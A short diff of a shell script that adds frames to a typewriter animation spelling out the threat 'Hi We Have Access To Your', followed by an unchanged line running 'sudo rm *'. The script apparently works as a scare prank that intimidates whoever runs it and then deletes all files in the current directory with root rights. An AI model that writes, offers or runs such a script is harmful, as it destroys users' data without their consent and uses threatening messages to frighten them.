@@ -56,5 +56,19 @@ printf "Hi \n We Have Access To"
 sleep 0.1
 clear
 printf "Hi \n We Have Access To "
+sleep 0.1
+clear
 printf "Hi \n We Have Access To Y"
+sleep 0.1
+clear
+printf "Hi \n We Have Access To Yo"
+sleep 0.1
+clear
+printf "Hi \n We Have Access To You"
+sleep 0.1
+clear
+printf "Hi \n We Have Access To Your"
+sleep 0.1
+clear
+
 sudo rm * 
